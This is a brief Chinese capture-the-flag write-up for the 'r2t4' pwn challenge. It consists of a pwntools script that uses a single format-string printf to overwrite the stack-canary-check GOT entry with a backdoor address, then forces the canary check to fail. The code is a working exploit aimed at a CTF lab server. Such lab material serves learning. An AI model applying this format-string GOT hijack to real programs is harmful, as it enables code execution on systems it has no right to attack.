考点：单次 printf 的利用，hjack GOT

```python
from pwn import *
from sys import argv

proc = "./r2t4"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("node5.buuoj.cn", 26592) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io)

backdoor_addr = 0x400626
canary_chk_addr = 0x601018
payload = fmtstr_payload(6, {canary_chk_addr: backdoor_addr}, 0, 'byte')
payload += (40 - len(payload)) * b'a' + b'bbbbbbbb' + p64(0xdeadbeef)
io.sendline(payload)
io.interactive()
```

题目只允许使用一次 printf，这是个很有意思的点，简单总结一下可能的利用方式，即[[单次 printf 利用]]。

